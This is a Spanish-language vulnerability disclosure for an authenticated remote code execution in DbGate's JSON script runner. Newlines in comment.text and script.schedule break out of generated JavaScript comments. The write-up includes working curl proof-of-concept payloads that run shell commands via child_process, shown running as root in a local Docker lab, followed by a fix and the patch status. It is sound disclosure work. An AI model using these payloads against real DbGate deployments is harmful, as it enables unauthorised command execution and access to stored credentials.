JSON runner newline injection RCE_

MediumRemote code executionCVE-2026-97225
DbGateRCENode.jsCode Generation

Alcance: toda la validación se realizó en un despliegue Docker local construido desde DbGate master / 7.2.4-packer-beta.3. El usuario de prueba estaba autenticado y no tenía el permiso run-shell-script. El hallazgo fue reportado mediante GitHub Security Advisory como GHSA-v9rq-w97f-8vpm; posteriormente se publicó CVE-2026-97225 y el parche quedó disponible en 7.2.5-beta.6.

Durante la revisión de DbGate encontré una ejecución remota de código autenticada en el JSON script runner. El runner convertía comandos JSON estructurados en JavaScript, pero emitía valores controlados por el usuario dentro de comentarios JavaScript de una sola línea sin escapar los saltos de línea.

Un usuario autenticado podía inyectar un newline, salir del contexto del comentario generado y ejecutar JavaScript arbitrario en el proceso del runner. Desde Node.js, esto permitía ejecutar comandos del sistema mediante APIs como child_process.

El problema era alcanzable mediante /runners/script-result y /runners/start. En el laboratorio Docker probado, el payload ejecutó id como root dentro del contenedor DbGate. En /runners/script-result, la salida del comando se devolvía directamente en la respuesta HTTP.

Rutas afectadas

La rama JSON de /runners/start convertía los comandos estructurados a JavaScript y ejecutaba el resultado:

if (script.type == 'json') {
  if (!platformInfo.isElectron) {
    if (!checkSecureDirectoriesInScript(script)) {
      return { errorMessage: 'DBGM-00284 Unallowed directories in script' };
    }
  }

  logJsonRunnerScript(req, script);

  const js = await jsonScriptToJavascript(script);
  return this.startCore(runid, scriptTemplate(js, false));
}

La misma generación JSON-to-JavaScript estaba disponible en /runners/script-result. Esta ruta esperaba un mensaje dataResult y devolvía su contenido en la respuesta:

scriptResult_meta: true,
async scriptResult({ script }) {
  if (script.type != 'json') {
    return { errorMessage: 'DBGM-00290 Only JSON scripts are allowed' };
  }

  const runid = crypto.randomUUID();
  this.requests[runid] = { resolve, reject, exitOnStreamError: true };
  const cloned = _.cloneDeepWith(script, node => {
    if (node?.$replace == 'runid') return runid;
  });
  const js = await jsonScriptToJavascript(cloned);
  this.startCore(runid, scriptTemplate(js, false));
}

La rama JSON alcanzaba startCore() con JavaScript generado antes de que las comprobaciones de run-shell-script y allowShellScripting de la rama no JSON fueran aplicadas.

Primer sink: comment.text

El comando de comentario del JSON runner pasaba comment.text a script.comment():

comment(s) {
  this._put(`// ${s}`);
}

El valor se emitía dentro de un comentario JavaScript de una sola línea, pero no se escapaban los saltos de línea. Un valor con un newline podía transformar el código generado de esta manera:

// safe comment
module.constructor._load('child_process').execFileSync('/bin/sh',['-c','id'])
//

La segunda línea ya no pertenecía al comentario y era ejecutada por el proceso del runner.

Segundo sink: script.schedule

También existía un sink independiente en getScript(schedule), donde script.schedule se añadía al comienzo del archivo JavaScript:

getScript(schedule = null) {
  const packageNames = this.packageNames;
  let prefix = _uniq(packageNames)
    .map(packageName => `// @require ${packageName}\n`)
    .join('');
  if (schedule) prefix += `// @schedule ${schedule}`;
  if (prefix) prefix += '\n';

  return prefix + this.s;
}

Un newline dentro de schedule terminaba el comentario // @schedule y permitía ejecutar JavaScript antes del cuerpo generado del runner.

Por qué era una ejecución inesperada

La entrada no se suministraba como un script libre. El atacante utilizaba campos de metadatos estructurados, como comment.text y script.schedule, que debían permanecer como datos no ejecutables:

JSON metadata
    ↓
JSON-to-JavaScript generator
    ↓
single-line JavaScript comment
    ↓  newline injection
generated executable JavaScript
    ↓
Node.js runner process
    ↓
child_process / OS command execution

Prueba de concepto local

La prueba utilizó una imagen Docker local llamada dbgate-vuln-lab, construida desde el árbol de código probado. El usuario estaba autenticado, pero configurado sin permiso para ejecutar scripts de shell:

docker run --rm -d \
  --name dbgate-rce-lab \
  -p 127.0.0.1:3103:3000 \
  -e LOGINS=hunter \
  -e LOGIN_PASSWORD_hunter=hunter \
  -e LOGIN_PERMISSIONS_hunter='*,~run-shell-script' \
  -v dbgate-rce-lab-data:/root/.dbgate \
  dbgate-vuln-lab

1. Autenticación

BASE="http://127.0.0.1:3103"

JWT=$(curl -s -X POST "$BASE/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"amoid":"logins","login":"hunter","password":"hunter"}' \
  | jq -r '.accessToken')

El servidor devolvió un token JWT para el usuario de laboratorio:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

2. RCE mediante /runners/script-result

El valor de comment.text incluía un salto de línea y código JavaScript. El código invocaba child_process para ejecutar id y enviaba el resultado por el canal dataResult:

curl -s -X POST "$BASE/runners/script-result" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "script": {
      "type": "json",
      "packageNames": [],
      "commands": [{
        "type": "comment",
        "text": "safe comment\nconst output = module.constructor._load('\''child_process'\'').execFileSync('\''/bin/sh'\'',['\''-c'\'','\''id'\'']).toString(); process.send({msgtype:'\''dataResult'\'', dataResult:{output}});\n//"
      }]
    }
  }' | jq

La respuesta observada fue:

{
  "output": "uid=0(root) gid=0(root) groups=0(root)\n"
}

El JavaScript inyectado se ejecutó en el proceso del runner y la salida del comando llegó directamente a la respuesta HTTP.

3. RCE mediante /runners/start

La misma inyección podía ejecutarse mediante /runners/start. Esta ruta devolvía un runid, por lo que confirmé la ejecución escribiendo un marcador en el contenedor:

curl -s -X POST "$BASE/runners/start" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "script": {
      "type": "json",
      "packageNames": [],
      "commands": [{
        "type": "comment",
        "text": "safe comment\nmodule.constructor._load('\''child_process'\'').execFileSync('\''/bin/sh'\'',['\''-c'\'','\''id > /tmp/dbgate_json_comment_rce.txt'\''])\n//"
      }]
    }
  }' | jq

El resultado devolvió un identificador de ejecución:

{
  "runid": "<RUN_ID>"
}

La lectura del marcador confirmó la ejecución dentro del contenedor:

docker exec dbgate-rce-lab sh -lc \
  'cat /tmp/dbgate_json_comment_rce.txt'

uid=0(root) gid=0(root) groups=0(root)

4. Sink alternativo en script.schedule

El mismo problema podía explotarse sin utilizar el comando de comentario, colocando la inyección en script.schedule:

curl -s -X POST "$BASE/runners/start" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "script": {
      "type": "json",
      "schedule": "safe\nmodule.constructor._load('\''child_process'\'').execFileSync('\''/bin/sh'\'',['\''-c'\'','\''id > /tmp/dbgate_json_schedule_rce.txt'\''])\n//",
      "packageNames": [],
      "commands": []
    }
  }' | jq

El archivo generado por el comando volvió a contener:

uid=0(root) gid=0(root) groups=0(root)

Impacto

Un usuario autenticado con acceso al endpoint del JSON runner podía inyectar JavaScript mediante campos de metadatos de comentarios y obtener ejecución remota de código en el proceso runner.

En el despliegue probado, el comando se ejecutó como root dentro del contenedor DbGate. Según la configuración del despliegue, el impacto puede incluir:

  • Ejecución arbitraria de comandos del sistema operativo.
  • Lectura de archivos accesibles para el proceso de DbGate.
  • Modificación o eliminación de archivos escribibles.
  • Acceso a conexiones guardadas, credenciales, secretos o volúmenes montados.
  • Denegación de servicio y posible compromiso del contenedor o del host.

La ausencia del permiso run-shell-script no impidió la explotación. El problema era la inyección de JavaScript en los campos del JSON runner, no la habilitación explícita de scripts de shell.

Corrección sugerida

Los valores insertados en comentarios JavaScript deben codificarse para impedir que un newline termine el contexto del comentario. Una alternativa más segura es no generar JavaScript a partir de metadatos controlados por el usuario y mantener los valores como datos estructurados.

La corrección debería aplicarse en ambos sinks:

  • Escapar o rechazar comment.text antes de pasarlo a script.comment().
  • Escapar o rechazar script.schedule antes de construir // @schedule.
  • Aplicar la comprobación de permisos al flujo JSON antes de llegar a startCore().
  • Añadir pruebas de regresión con saltos de línea, caracteres de control y payloads multilínea en ambos endpoints.

Estado

El hallazgo fue reportado mediante GitHub Security Advisory como GHSA-v9rq-w97f-8vpm. Posteriormente se publicó CVE-2026-97225 y el parche fue incorporado en 7.2.5-beta.6.
